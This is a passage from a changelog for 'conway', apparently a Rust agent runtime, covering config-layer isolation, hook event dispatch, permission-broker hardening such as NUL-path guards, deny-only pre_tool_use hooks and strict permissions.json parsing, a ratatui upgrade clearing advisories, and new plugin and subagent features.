  there was no way anywhere in the public API to opt OUT of that layer. Two
  in-process test suites (`crates/conway-cli/tests/continuity.rs`,
  `oneshot_ask.rs`) failed on any machine whose real
  `~/.conway/settings.json` named a backend kind the facade under test does
  not link -- the operator's own config was correct; the gap was that
  nothing let a caller say "ignore it."
  `ConwayBuilder::from_config_only(path)` and its underlying
  `conway::config::load_ignoring_user_config` are the new seam: identical to
  `from_config`/`load`, except the user layer is never read (the merge
  becomes `default < project < env < CLI`, four sources instead of five).
  `env` is deliberately NOT suppressed by this seam -- `CONWAY_*` variables
  are how CI and container entrypoints hand a specific invocation its own
  credentials, not ambient state left over from someone else's home
  directory; see `load_ignoring_user_config`'s own doc for the full reasoning.
  `from_config`'s documented behavior is unchanged. A structural guard
  (`crates/conway/tests/config_isolation_guard.rs`) now fails the suite if a
  future in-process test starts reading ambient config again.
  (`crates/conway/src/config/merge.rs`, `crates/conway/src/config/mod.rs`,
  `crates/conway/src/builder.rs`, `crates/conway-cli/tests/continuity.rs`,
  `crates/conway-cli/tests/oneshot_ask.rs`,
  `crates/conway/tests/config_isolation_guard.rs`, `docs/embedding.md`)

- **`hooks.rules[]` entries can now target one tool instead of firing for
  every call**. A `pre_tool_use` or
  `post_tool_use` rule with no `match` fires for every tool, exactly as
  before this item; a rule with `match` set narrows to calls whose tool
  satisfies it -- an exact name (`"bash"`) or a `*`-glob against the tool's
  whole name (`"fs.*"`), the two shapes `PHILOSOPHY.md` §5's own canonical
  example needs and no more (no regex dialect). Before this item, the
  canonical example on that page -- run the formatter after a write -- was
  unwriteable: the rule would fire on every read, every glob, every bash
  call, and the script itself would have to parse the payload to find out
  whether it should do anything. `match` closes that gap. **The wire
  spelling is literally `"match"`**, matching the page exactly (the Rust
  field is `match_tool`, since `match` is a reserved word) -- the config
  shape otherwise stays the flat, per-entry-`event` list it already was;
  see `crates/conway/src/config/schema.rs`'s `HookEntry::match_tool` for the
  full config-shape decision this item records. Setting `match` on any
  event that carries no tool name (`session_starting`, `child_spawned`,
  `request_assembled`, `child_reported`, `prompt_submitted`) is a load-time
  config error naming the offending rule's `id`, never a silently-inert
  rule.
  (`crates/conway-core/src/hook.rs`, `crates/conway-runtime/src/permission.rs`,
  `crates/conway-runtime/src/hook_dispatch.rs`,
  `crates/conway/src/config/schema.rs`, `crates/conway/src/config/merge.rs`,
  `crates/conway/src/builder.rs`, `crates/conway-runtime/tests/hook_dispatch.rs`,
  `crates/conway/tests/config_validation.rs`, `docs/plugins/hooks.md`)

- **The last two `hooks` events -- `request_assembled` and
  `child_reported` -- now dispatch**,
  closing the gap the previous `hooks` dispatch entry below left open ("Two
  events remain forward-declared"). Both are OBSERVATION-ONLY, joining
  `post_tool_use`/`session_starting`/`child_spawned` rather than becoming a
  fourth shape: they cannot deny anything and a failing hook is logged and
  swallowed, never propagated. No new machinery was needed -- both reuse the
  identical `HookRunner` port and `HookDispatcher` the three earlier
  observation events already run through; this item adds only its own two
  dispatch call sites. `request_assembled` fires once per turn, from
  `AgentLoop::run_inner`, after `ContextBuilder::build` and (if one is
  registered) `ContextHook::before_request`'s own edit, and before that
  turn's route/attempt call -- the FINAL assembled request, never the
  pre-hook one. Its payload is a SUMMARY (segment count, estimated tokens,
  tokenizer, turn, an unrouted model pin if one is set), not a full segment
  dump: shipping the whole assembled context verbatim on every turn is a
  performance/privacy decision this item does not make unilaterally.
  **Observation-only despite sitting at the exact seam
  `ContextHook::before_request` already edits the assembled request at** --
  a reasonable thing to expect it to edit too, so this is stated rather than
  left a surprise; a configured script editing assembled context
  append-only without breaking the prompt cache is a separate, still-open this one does not build and does
  not foreclose. `child_reported` fires for every terminal `AgentResult`
  that crosses back to a parent -- both a normal completion
  (`AgentLoop::finish`) and a supervisor-synthesized one (`supervisor.rs`: a
  panic, or a task unresponsive past its grace window) -- from TWO dispatch
  call sites gated on the identical publish-race winner `Event::AgentFinished`
  already uses at each site, so it fires exactly once per agent regardless
  of which side wins; it never fires for a root's own finish, since a root
  has no parent for a result to cross back to.
  (`crates/conway-runtime/src/hook_dispatch.rs`,
  `crates/conway-runtime/src/agent_loop.rs`,
  `crates/conway-runtime/src/supervisor.rs`, `crates/conway-runtime/src/runtime.rs`,
  `crates/conway/src/config/schema.rs`, `crates/conway-runtime/tests/hook_dispatch.rs`,
  `crates/conway-runtime/tests/supervisor.rs`, `docs/plugins/hooks.md`)

### Security

- **Two safety-bearing code duplications collapsed to a single implementation
  each -- repairs, shipped ungated**. Both close the same named failure mode: a guard
  present in one copy and silently absent from a sibling, which no test of the
  surviving copy can detect, because the sibling is a different function no
  assertion about the first one reaches -- **already on the record in this
  tree**, not theoretical: the NUL guard previously went missing from two
  inlined path-resolution copies before
  pointed both at `conway_runtime::permission::resolve_like_the_tool_will`.

  **Root canonicalization.** That fix left `resolve_like_the_tool_will`
  (`conway-runtime`) and `conway_tools::common::resolve_path` (`conway-tools`)
  as two independent, same-behavior implementations, "kept in sync" only by a
  doc comment demanding lockstep edits -- crate layering (`conway-runtime ->
  conway-core`, `conway-tools -> conway-core`, never `conway-runtime ->
  conway-tools`) meant neither crate could call the other's copy directly.
  Both now delegate to one new shared primitive,
  `conway_core::containment::resolve_candidate`, so the two wrappers can no
  longer independently drop the NUL guard. Verified per-callsite, not just
  against the shared function: a NUL-carrying path argument is rejected
  driven through the real `read`/`write`/`edit`/`cd`/`glob`/`grep` tools
  (`crates/conway-tools/src/fs/*.rs`), through `PermissionBroker::check_root`
  end to end via a real spawned agent (`crates/conway/tests/
  root_containment_seam.rs`, asserting the persisted `ToolResult` names the
  guard's own distinctive wording, not a coincidental downstream OS-level
  rejection), and through a `paths_under` rule's prefix resolution
  (`crates/conway/tests/structured_rule_seam.rs`). Each test was confirmed to
  go red with the guard temporarily removed, then restored.

  **The allow/deny/prompt decision path.** Investigated whether the
  apparent 4-5 sites (a cached grant, a mode gate, a hook verdict, a pattern
  grant, a deny/prompt rule) were genuinely one computation or only
  superficially similar -- verdict: **mostly the latter, correctly left
  alone** (`PermissionBroker::decide`'s eight-step ordering already
  dispatches each to its own legitimately-distinct route, unchanged by this
  item). The one genuine restatement found: `PatternRule::matches_render`/
  `matches_deny` (the flat rule syntax) carried full independent copies of
  the metacharacter gate and prefix comparison `Rule::matches_allow_render`/
  `matches_deny_render` (the structured evaluator) already implemented --
  and NO production caller ever reached the flat copies (`PermissionBroker`
  desugars every flat rule to a `Rule` via `to_rule` before storing it, so
  `pattern_allows`/`deny_matches`/`prompt_matches` only ever consult the
  structured evaluator). The flat methods now delegate to the structured
  ones directly. Verified by driving both the flat (`remember_pattern`) and
  structured (`remember_pattern_rule`) installation paths through
  `PermissionBroker::decide` with an equivalent grant, asserting on the
  persisted `PermissionOutcome` (never a gate-call count, since a correct
  refusal and a silent bypass both produce zero gate calls) that a chained
  shell command defeats the metacharacter gate identically either way
  (`crates/conway-runtime/tests/permission_broker.rs`), confirmed red with
  the shared gate temporarily disabled, then restored.
  (`crates/conway-core/src/containment.rs`, `crates/conway-core/src/
  permission_pattern.rs`, `crates/conway-runtime/src/permission.rs`,
  `crates/conway-tools/src/common.rs`, `crates/conway-tools/src/fs/*.rs`,
  `crates/conway-runtime/tests/permission_broker.rs`, `crates/conway/tests/
  root_containment_seam.rs`, `crates/conway/tests/structured_rule_seam.rs`)

- **`ratatui` upgraded 0.29 -> 0.30, clearing the transitive `lru`
  use-after-free/`IterMut` advisories and the unmaintained `paste` crate from
  the dependency graph**. Filed by when `cargo-deny` was introduced: that
  item's `deny.toml` set `unmaintained = "workspace"`, which correctly reports
  an unmaintained crate the workspace depends on directly but stays quiet
  about one that only arrives transitively -- so `ratatui` 0.29's pin of
  `lru = "0.12.0"` (RUSTSEC-2026-0253, RUSTSEC-2026-0002, both
  `informational = "unsound"`, patched at `>= 0.18.2` and `>= 0.16.3`
  respectively) and its pull of the unmaintained `paste` sat in the graph
  unreported. `ratatui` 0.30 drops both: `lru` now resolves to the single
  workspace-pinned 0.18.2 everywhere (`cargo tree -i lru@0.12.5` and
  `cargo tree -i paste` both error "did not match any packages"), confirmed
  clean even with `unmaintained` temporarily flipped to `"all"` -- the setting
  that would have reported `paste` -- rather than merely unreported under the
  narrower default. The upgrade forced one mechanical, non-behavioral fix:
  ratatui 0.30 widened `Backend::Error` from the fixed `std::io::Error` it was
  in 0.29 to `type Error: core::error::Error` (so `TestBackend`'s own
  `Infallible` can implement it too), so the four `conway-cli` call sites that
  mapped a `Backend::Error` straight into `conway::ConwayError::Io` needed an
  explicit `.into()` behind a new `B::Error: Into<std::io::Error>` bound --
  satisfied trivially by `CrosstermBackend`, the only backend this crate ever
  instantiates those methods with. The workspace's own `crossterm` pin moved
  0.28 -> 0.29 alongside it, to stay the same resolved instance ratatui's
  crossterm backend now defaults to -- otherwise `conway-cli`'s direct
  `crossterm` dependency (present solely to turn on the `bracketed-paste`
  feature via Cargo's same-version feature unification; the crate is never
  named directly in `conway-cli` source, everything goes through
  `ratatui::crossterm::*`) would have silently stopped reaching the crossterm
  instance ratatui actually renders through. (`Cargo.toml`, `Cargo.lock`,
  `deny.toml`, `crates/conway-cli/src/tui/app.rs`)

- **A `pre_tool_use` hook written in a `settings.json` now actually runs
  under the CLI**. built the enforcement -- a hook script that
  refuses a tool call, checked at the same tier as a `deny` pattern rule so
  it holds under every permission mode -- but that mechanism only runs when
  an embedder injects a runner, and `conway-cli` injected none. An operator
  who wrote a `pre_tool_use` rule got a config that parsed, validated,
  rejected typos, and was **never consulted**: a guardrail they believed
  they had installed did not exist. That is as bad as a nothing-may-claim-
  to-be-reached-that-isn't violation gets: user-facing configuration that
  does nothing (precedent `probe_enabled`) with an
  aggravator the prober never had -- the configuration is security-bearing,
  so the operator did not merely miss a benefit, they held a false belief
  about what was being blocked while running an agent with tool access.
  `ConwayBuilder::with_default_hook_runner` (new, `builtin-tools`-gated)
  supplies `conway_tools::hook_runner::ProcessHookRunner`, and
  `conway-cli`'s `build_conway` calls it unconditionally. **The injection
  lives in the facade, not the CLI**, because `conway-cli` may depend only
  on the `conway` facade -- `cli_surface::no_forbidden_deps` enforces that,
  and its own comment records the same shortcut being tried and reverted
  twice before; `conway` already carries `conway-tools` behind its default
  `builtin-tools` feature, and `builder.rs` already used exactly this shape
  for built-in tool plugins. `with_hook_runner` remains the general
  injection point a third party uses on the identical surface a built-in
  uses; the new method is a convenience supplying the in-tree
  default, deliberately NOT collapsed into it. **Scope, stated precisely
  because the disclosure is the point:** a rule driving the CLI fires; an
  embedder linking `conway` directly still gets nothing unless it calls one
  of the two methods itself; and every `event` other than `pre_tool_use`
  remains parsed-and-validated only. Guarded end to end rather than at the
  seam -- an integration test drives the real compiled binary through a
  one-shot with an isolated `CONWAY_CONFIG_DIR`, and asserts the on-disk
  session transcript's denial names the HOOK ID. That precision is
  load-bearing: with the injection removed the call is still denied, by the
  default allow-list gate (`tool 'bash' is not in the allow list`), so a
  test asserting only "denied" would pass whether or not the wiring existed.
  (`crates/conway/src/builder.rs`, `crates/conway-cli/src/main.rs`,
  `crates/conway-cli/tests/hook_runner_wiring.rs`,
  `crates/conway/src/config/schema.rs`, `docs/plugins/hooks.md`)

- **BREAKING: a misspelled key in `permissions.json` now fails to load
  instead of silently installing zero rules**. A file containing `"denys"` instead of
  `"deny"` previously parsed cleanly — the typo'd key was ignored as
  unrecognized, `deny` fell back to its empty default, and the operator's
  rule installed nothing, with no error anywhere. `deny` always applies
  regardless of trust (the one guarantee this project's permission model is
  built on), so a typo silently defeating it was a fail-open security
  outcome, not a cosmetic one. `RawPermissionFile` — the private struct
  inside `conway_core::permission_pattern::parse_permission_file` that
  `parse_rules`/`parse_deny_rules`/`parse_prompt_rules` actually deserialize
  operator input through, not the public `PermissionFile` type used only for
  the revoke/append round-trip writers — now carries a
  `#[serde(flatten)]` catch-all `extra` map instead of
  `#[serde(deny_unknown_fields)]` (the two are mutually incompatible in
  serde): an unknown key is detected structurally, from that map being
  non-empty, rather than by matching text inside a `serde_json::Error`'s
  message — a wording neither serde's nor serde_json's own semver contract
  covers. `Conway::load_permission_files` and `Conway::trust_permission_file`
  both check `permission_file_unknown_field_error` before parsing any rule
  from a file, and when it fires the WHOLE file is refused (no allow, deny,
  or prompt rule from it installs) with a message naming the offending key,
  surfaced through the same `Entry::Error { fatal: false }` transcript
  channel a registration error already uses — at BOTH the startup loader
  and the `/trust permissions` command, which previously reported the
  identical failure through the weaker, skippable `Entry::Notice` channel.
  **Breaking:** any
  `permissions.json` that previously loaded despite naming a key outside
  `allow`/`deny`/`rules` (a typo, or a since-removed field) now fails to
  load at all instead of silently ignoring the extra key; every shipped
  example in this tree used only recognized keys and needed no changes.
  `PermissionFile`'s own `TrustFile`/`TrustedRecord` sibling
  (`crates/conway/src/config/trust.rs`) deliberately does NOT get the same
  treatment: nobody hand-types a key into `trust.json` (it is written and
  read exclusively by this crate across whatever two conway builds an
  operator runs before and after an upgrade), so its realistic risk is
  version skew, not a typo, and the same strictness there would zero every
  recorded trust decision in the file the first time an older build reads
  one a newer build wrote — a regression with no matching security upside,
  since an untrusted-by-mistake record only ever means more prompting, never
  less. See [`docs/permissions.md`](docs/permissions.md#rules-in-permissionsjson)
  and [`docs/plugins/compatibility.md`](docs/plugins/compatibility.md) for
  the full account of both decisions.
  (`crates/conway-core/src/permission_pattern.rs`, `crates/conway/src/conway.rs`,
  `crates/conway/src/config/trust.rs`, `crates/conway-cli/src/tui/app.rs`,
  `crates/conway/tests/permission_trust_seam.rs`, `docs/permissions.md`,
  `docs/plugins/compatibility.md`)

- **A configured `pre_tool_use` hook can now actually refuse a tool call --
  wired at the ONE tier in `PermissionBroker::decide` that no permission
  mode can route around**. Placement
  was the whole difficulty: a hook checked downstream of `gate.check` (or
  implemented as a `PermissionGate` itself) would see only the calls that
  reach the operator's prompt and NONE resolved by a cached `AllowAlways`
  grant, a matching pattern-allow rule, or `AutoAllow` mode -- it would
  evaporate entirely under `AutoAllow`, the one mode with no human already
  in the loop to catch what the hook exists to catch. The new hook-check
  step sits at the SAME tier as the existing `deny`-pattern check --
  immediately after it, before the mode gate, the cache, pattern-allow
  grants, and `AutoAllow` -- so a denying hook is enforced under every
  permission mode, proven by a test that configures `AutoAllow` plus a
  denying hook and asserts the call is still denied (plus one test each for
  the cache-bypass and pattern-allow-bypass paths a downstream
  implementation would have missed). **Deny-only, never allow, at the type
  level, not by convention:** the hook's answer field
  (`conway_core::hook::HookAnswer::permission`) is a new
  `HookPermissionVerdict` enum with exactly two variants, `NoOpinion` and
  `Deny { reason }` -- there is no `Allow` variant anywhere in the type for
  a future edit to accidentally start acting on (: a hook may only narrow a permission verdict,
  never widen one; mirrors `permission_pattern::Then`'s own
  plugin-rule restriction one layer down, but as a structural omission
  rather than a runtime rejection a future edit could get wrong).
  **Fail-closed inherits from the runner, not a second implementation of
  it:** a missing script, a timeout, a nonzero exit, or stdout that fails to
  parse as `HookAnswer` are all `HookFailure`, and `PermissionBroker::
  decide` treats every one of them as a denial directly. **Deny-only over a
  three-way (deny/prompt/no-opinion) shape, decided and recorded:** a
  `prompt`-forcing verdict would need its own `must_reach_gate` source with
  different provenance than the existing `prompt`-pattern step, which is
  exactly the kind of policy-branching growth this project deliberately
  avoids; an operator who wants "ask every time" for a call shape a plugin
  author can identify already has the pattern-rule mechanism for it. **This
  is what makes `conway_core::ports::HookRunner` reachable at all** -- the
  port previously had no injection point and no caller anywhere in the
  tree. `ConwayBuilder::with_hook_runner` injects an `Arc<dyn HookRunner>`
  on the identical surface `with_permission_gate`/`with_context_hook`
  already use (`conway`'s `plugin` extension-surface module now
  re-exports `HookRunner`/`HookInvocation`/`HookEvent`/`HookAnswer`/
  `HookPermissionVerdict`/`HookFailure` so a third party can implement it
  without depending on `conway-core`), and `conway-runtime` reaches it only
  through `conway_core::ports` -- never through `conway-tools` (: the two are siblings; the runner arrives
  already constructed). **Additive, not automatic:** with no
  `with_hook_runner` call (the default) `PermissionBroker::decide` is
  byte-for-byte unchanged -- the entire pre-existing `permission_broker.rs`
  suite (46 tests) passes unmodified -- and a `hooks.rules[]` entry with
  `event: "pre_tool_use"` still parses and validates with no runner
  injected, it just is silently never consulted (disclosed at every
  relevant declaration site, not only here). `hooks`'s own forward-
  declaration label is corrected to be precise PER EVENT: `pre_tool_use` is
  now dispatched; every other `event` value remains exactly the forward
  declaration it always was. Docs updated to match: `docs/plugins/hooks.md`
  point 13's status row (and its sibling point 7 correction, since that
  row's forward reference to this item's eventual answer shape turned out
  to name a different shape than what shipped) and `docs/plugins/scripts.md`'s
  top note.
  (`crates/conway-core/src/hook.rs`, `crates/conway-core/src/ports/hook_runner.rs`,
  `crates/conway-runtime/src/permission.rs`, `crates/conway-runtime/src/runtime.rs`,
  `crates/conway/src/builder.rs`, `crates/conway/src/lib.rs`,
  `crates/conway/src/config/schema.rs`, `crates/conway/tests/plugin_surface.rs`,
  `crates/conway-tools/tests/hook_runner.rs`, `docs/plugins/hooks.md`,
  `docs/plugins/scripts.md`)

### Added

- **A plugin can now declare a TUI slash command — the closed `SlashCommand`
  enum was the last genuinely privileged surface a plugin could not reach**
 . `Plugin::commands()` (new, default
  empty -- every existing implementor keeps compiling unmodified) returns
  `Arc<dyn Command>`s; each declares a bare `CommandSpec { name, summary }`
  and an async `invoke(CommandCtx) -> CommandOutcome` (`Output(Vec<String>)`
  appended to the transcript, or `Error(String)` shown as an ordinary
  `Notice`). Registered as `/<plugin manifest id>.<command name>` --
  **mandatory namespacing, not merely convention**: no built-in command word
  contains the namespace separator (the exact rule `conway_core::event_name`
  already enforces for plugin-declared events, reused rather than
  reinvented), so a plugin declaring a command named `help` registers
  cleanly as its own `/<its id>.help` and can never shadow the built-in
  `/help` -- structurally, not by a runtime check that could have a gap. Two
  commands landing on the identical full name (same plugin twice, or two
  plugins) IS refused, with a named, install-time error -- the collision
  namespacing does not already rule out. **Everything goes through
  `commands::parse`**: a plugin command is an ordinary `SlashCommand::Plugin`
  variant of the same closed enum every built-in is, not a second dispatch
  path (`crates/conway/tests/architecture_invariants.rs`'s T9 guard, pinned
  at exactly four PRE-existing parser bypasses, is unaffected). **A hanging
  or panicking command cannot freeze the TUI**: `commands::execute` resolves
  a command (a synchronous lookup) but never calls `invoke` itself --
  `App::spawn_plugin_command` runs it on its own `tokio::spawn`ed task, off
  the render/input loop entirely, with its reply delivered through a channel
  (mirroring `/ask`'s existing modal-answer plumbing) and a panic converted
  into an ordinary `CommandOutcome::Error` rather than propagating. A
  declared command appears in the `/` palette alongside every built-in
  (`/help` itself stays keybindings-only, by the existing T7/V4 convention --
  "see `/` for those"). **Deliberately narrow capability grant**:
  `CommandCtx` carries only read-only agent identity and the raw argument
  text -- no live `Conway`/`SessionHandle`, since `Plugin`/`Command` live in
  `conway-core`, which cannot depend on the facade crate where session
  manipulation lives without a cycle; a command cannot fork, resume, or
  steer a session. `conway-plugin-skeleton` gains `/conway.plugin_skeleton.ping`,
  the worked example's command half (its tool half, `skeleton_ping`, is
  unchanged). Documented in `docs/plugins/hooks.md` point 15 (the trust
  posture -- no permission gate at all, since the OPERATOR typed it directly,
  unlike a model-proposed tool call -- in `docs/plugins/trust-and-security.md`)
  and `docs/interactive.md`. (`crates/conway-core/src/ports/plugin.rs`,
  `crates/conway-core/src/event_name.rs`, `crates/conway/src/lib.rs`,
  `crates/conway-cli/src/tui/{commands,app,input,state,mod}.rs`,
  `crates/conway-cli/src/tui/view/{palette,help}.rs`,
  `crates/conway-cli/src/{first_party_plugins,main}.rs`,
  `crates/conway-plugin-skeleton/src/lib.rs`)

- **`ConwayBuilder::install_selected(plugins, router_factories,
  backend_factories)` — plugin assembly is now a facade capability, not a
  CLI privilege**. Before this,
  `crates/conway-cli/src/first_party_plugins.rs` carried ~70 lines of
  hand-rolled resolution -- matching `plugins.install` (unioned with
  `plugins.default_backends` for the backend arm) against whichever
  plugin/router-factory/backend-factory crates the CLI binary happened to
  link -- and it was the *only* place that logic existed: every other
  embedder wanting the same "declare an id in config, attach the matching
  implementation" mechanism had to reimplement it from scratch, and
  `docs/embedding.md` taught them to by showing a hand-rolled `if
  wanted.iter().any(...)` loop. `install_selected` is that resolution,
  moved onto `ConwayBuilder` and generalized to any caller-supplied
  bundles. `conway-cli`'s own resolution collapses to constructing its
  three `Vec`s and calling it -- the ~70 lines are gone from the CLI, not
  duplicated. **The facade still depends on no plugin crate**
  (`crates/conway/Cargo.toml` names none, unchanged, asserted by the
  workspace's own architecture guards): the three bundles are
  caller-supplied, already-constructed values: `install_selected` matches
  each entry's own identity (`Plugin::manifest().id`, `RouterFactory::
  id()`, `BackendFactory::id()`) against a configured id string, and never
  maps an id to a crate itself -- this class of shortcut has been tried and
  reverted twice in this repository before, each time caught by an
  architecture test rather than review. The three installable shapes stay
  distinct, never flattened into one: a `Plugin`/`Tool` and a
  `RouterFactory` both resolve from `plugins.install`, but a
  `RouterFactory` is selected before construction and capped at one match
  (a build has exactly one router); a `BackendFactory` resolves from the
  separate, default-on `plugins.default_backends`, where an operator
  opts *out* rather than in (a build with zero backends cannot reach a
  model at all, unlike an absent plugin or router). An id resolving to
  nothing in any of the three supplied bundles is a hard, named
  `ConwayError::Config` -- never a silent no-op -- matching the CLI's own
  pre-existing unknown-id diagnosis. Proven reachable by a genuinely
  out-of-workspace crate (a scratch crate authoring its own `Plugin`,
  `RouterFactory`, and `BackendFactory` against `conway::plugin`/
  `conway::backend`/`conway::` alone, installing all three through one
  `install_selected` call, and completing a real turn), not merely by an
  in-workspace test.

- **Four more `hooks` events now dispatch, in two tiers that fail in
  opposite directions** (and). `post_tool_use`, `session_starting` and
  `child_spawned` are OBSERVATION-ONLY: they cannot deny anything and they
  fail OPEN, so a hook that errors or times out is logged and the operation
  it observed is unaffected. That is the opposite of `pre_tool_use` and it
  is deliberate -- the observed thing has already happened, so breaking a
  working tool call because a logging script misfired would be the wrong
  direction. `prompt_submitted` is the third shape: it fires at both
  prompt-submission sites before the text reaches the agent loop, it may
  DENY, and it may never MODIFY. The no-modification half is a type
  guarantee rather than an unwired path -- the dispatch reads only a verdict
  enum with no variant capable of carrying replacement text, because the
  user's own words are the one thing in the pipeline nothing gets to
  launder. A denial surfaces to the CALLER as `RuntimeError::PromptDenied`,
  never to a model as a tool error, since there is no model turn yet to
  report into. Whether `child_spawned` may ever deny a spawn is an open
  question, deliberately deferred and recorded at its dispatch site rather
  than settled by the shape of a return type. Two events remain
  forward-declared: `request_assembled` and `child_reported`.

- **A parent that fans out several children (`await: false`) now observes
  each child's completion on its own very next turn, without ever calling
  `conway_await` on it**. A child's
  `AgentLoop::finish` has always delivered its terminal `AgentResult` to its
  parent's mailbox, but before this item that delivery was consumed only by
  a caller that had actually blocked on that specific child by id
  (`AgentTree::await_result`); a parent that never did had no way to learn
  any of its children had finished. `mailbox::classify` now maps a drained
  `AgentMessage::Result` to `DrainEffect::Persist` — the exact same path
  `AgentMessage::Steer` already takes to become `LogRecord::ParentSteer` —
  producing a new `LogRecord::ChildResultRecord`. The parent's own next
  `SessionStore::read` picks it up like any other own record, and
  `context::builder`'s `own_segment` turns it into a `Role::System` segment
  tagged with a new `Provenance::ChildResult { from }`, never anything that
  would misattribute the child's output as the parent's own. No new
  primitive, no public signature change, and `AgentTree::await_result`'s
  blocking path is entirely untouched — this is purely an additional
  non-blocking notification path. Docs updated to match:
  [`docs/agents.md`](docs/agents.md#a-model-tool-call)'s `await` section and
  provenance vocabulary list, and
  [`docs/sessions.md`](docs/sessions.md#the-append-only-log)'s record-kind
  table.
  (`crates/conway-core/src/log.rs`, `crates/conway-core/src/provenance.rs`,
  `crates/conway-core/src/segment.rs`, `crates/conway-runtime/src/mailbox.rs`,
  `crates/conway-runtime/src/agent_loop.rs`,
  `crates/conway-runtime/src/context/builder.rs`,
  `crates/conway-runtime/src/result.rs`, `crates/conway/src/session_handle.rs`,
  `crates/conway-cli/src/tui/commands.rs`,
  `crates/conway-runtime/tests/steering.rs`,
  `crates/conway-session/tests/store_tests.rs`,
  `crates/conway-session/tests/codec_tests.rs`, `docs/agents.md`,
  `docs/sessions.md`)

- **`ContextHookCtx` now carries `agent_path`, the same root-first,
  self-inclusive ancestry chain `PermissionRequest.agent_path` already
  carried**. A registered
  `ContextHook` was told *which* agent it was running for but not *where*
  that agent sat in the tree — it could not behave differently for a
  top-level agent than for one four levels down, even though the permission
  side of the runtime has had exactly this information since `agent_path`
  was added to `PermissionRequest`. Both `ContextHookCtx` construction sites
  in `AgentLoop::run_inner` now set `agent_path: self.agent_path.clone()` —
  the SAME field `ToolBatchCtx`/`PermissionCtx` build `PermissionRequest.
  agent_path` from, so the two ports cannot silently diverge. **Required,
  not defaulted:** unlike `PermissionRequest`, `ContextHookCtx` is not
  `Serialize`/`Deserialize` and has no wire format to stay compatible with,
  so there is no serialization justification for a `#[serde(default)]`-style
  silent empty vector, and a hook's whole reason to want this field is
  telling a deep agent apart from a shallow one — a field that defaults to
  `vec![]` would let a caller forget to plumb it and never notice. A test
  fixture that needs one and doesn't care about depth can use
  `vec![agent_id]` (a root agent's own path). **Breaking** for any
  out-of-tree code constructing `ContextHookCtx` by field literal (every
  hook *consuming* one — `_ctx: &ContextHookCtx` — needs no change; only a
  test/fixture that builds the struct itself does). Docs updated to match:
  `docs/plugins/hooks.md` point 3's field table and a new paragraph on what
  the field is for, plus the two hand-built `ContextHookCtx` examples in
  `docs/plugins/authoring.md` and `docs/plugins/cookbook.md`.
  (`crates/conway-core/src/ports/plugin.rs`, `crates/conway-runtime/src/agent_loop.rs`,
  `crates/conway/tests/plugin_surface.rs`, `crates/conway-runtime/tests/agent_loop_e2e.rs`,
  `docs/plugins/hooks.md`, `docs/plugins/authoring.md`, `docs/plugins/cookbook.md`)

- **`SubagentSpec` gains `tag`, an opaque consumer correlation identifier
  carried onto `ContextHookCtx.tag`** . An embedder mapping conway agents
  onto its own domain objects (a file, a job, a node in its own tool) had
  nowhere to attach its own identifier at creation time -- the association
  could only be recorded after `SubagentHost::start` returned, which raced
  the child's first turn: a `ContextHook` firing on that turn found nothing
  in a side table keyed on an id that did not exist yet. Decision ruled out the two alternatives considered (a
  caller-supplied `AgentId`, which converts a conway-enforced invariant --
  subtree permission scoping resolves entirely by comparing agent ids -- into
  a caller obligation with a silent collision failure mode; and a
  prepare/launch split, which forces two surfaces for one operation) in favor
  of an opaque tag conway never reads. `tag: Option<String>` threads
  unread from `SubagentSpec` (`conway-core`) through `AgentSpec`
  (`conway-runtime`'s `SubagentHost::start`) onto every `ContextHookCtx` for
  that agent's turns -- **conway's first genuinely uninterpreted consumer
  field**: unlike `role` (a routing input) or `ask_origin` (branched on to
  gate `result_contract` attachment), nothing in the runtime ever matches,
  compares, or branches on `tag` -- grep-verified against every read site
  (three: `agent_loop.rs`'s two `ContextHookCtx` constructions and
  `subagent.rs`'s `AgentSpec` construction, all plain `.clone()`). Proven,
  not merely asserted: a tag containing control characters/multi-byte/non-BMP
  content, an empty string, and a 100,000-character string all round-trip
  byte-for-byte unchanged, and two agents differing ONLY in their tag are
  shown to take identical routing, context-assembly, budget, and logging
  paths (`crates/conway-runtime/tests/subagent_fork_spawn.rs`'s
  `two_agents_differing_only_in_tag_take_identical_routing_context_and_logging_paths`).
  **Scoped to `ContextHookCtx` only** -- the spec's "ideally
  `PermissionRequest` too" is left as a follow-on, since nothing forces it
  yet and it would require threading through an additional type.
  **Required on `AgentSpec`/`ContextHookCtx`, `#[serde(default)]` on
  `SubagentSpec`:** `SubagentSpec` is `Serialize`/`Deserialize` (a genuine
  backward-compatibility case, alongside `cwd`/`root`), so a spec serialized
  before this field existed still deserializes as `None`; `AgentSpec` and
  `ContextHookCtx` are neither, so -- matching's `agent_path` precedent -- there is no
  serialization justification for a silent default there, and every
  construction site (including every test fixture) states the field
  explicitly. Not yet exposed on the facade's `ForkSpec`/`SpawnSpec`: an
  embedder wanting a tag today constructs a `SubagentSpec` directly. Docs
  updated to match: `docs/plugins/hooks.md` point 3's field table and a new
  paragraph on what the field is for, plus the two hand-built
  `ContextHookCtx` examples in `docs/plugins/authoring.md` and
  `docs/plugins/cookbook.md`.
  (`crates/conway-core/src/agent.rs`, `crates/conway-core/src/ports/plugin.rs`,
  `crates/conway-runtime/src/agent_loop.rs`, `crates/conway-runtime/src/subagent.rs`,
  `crates/conway-runtime/src/runtime.rs`, `crates/conway/src/subagent_spec.rs`,
  `crates/conway/src/session_handle.rs`, `crates/conway/src/intent.rs`,
  `crates/conway-tools/src/subagent/tools.rs`, `crates/conway-tools/src/subagent/ask.rs`,
  `crates/conway-runtime/tests/subagent_fork_spawn.rs`,
  `crates/conway-runtime/tests/ask.rs`, `crates/conway-runtime/tests/steering.rs`,
  `crates/conway-runtime/tests/step_digest.rs`, `crates/conway-runtime/tests/report_only_agent.rs`,
  `crates/conway-runtime/tests/result_contract.rs`, `crates/conway-runtime/tests/agent_loop_e2e.rs`,
  `crates/conway/tests/plugin_surface.rs`, `docs/plugins/hooks.md`,
  `docs/plugins/authoring.md`, `docs/plugins/cookbook.md`)

- **A `hooks` config section that parses and validates -- forward
  declaration, nothing dispatches yet** (, child of the declarative-hooks umbrella). `settings.json` now accepts a `hooks`
  block: `HooksConfig { rules: Vec<HookEntry> }`, each rule an `id`
  (required, non-empty, unique across the file -- `merge::validate`'s new
  check), `event` (a bare string; the bare-vs-namespaced convention is a
  sibling item's open decision, not this one's), `command` (an argv vector,
  never a shell string, so config carries no shell-quoting ambiguity),
  `timeout_ms` (default `5000`), and `enabled` (default `true`). Every new
  struct carries `#[serde(deny_unknown_fields)]`, at both the container and
  the entry level -- a typo'd key inside a rule (`"evnet"`, `"comand"`)
  fails to parse exactly like a typo anywhere else in this file, not just a
  typo'd top-level key. **This is config only.** No dispatcher, no
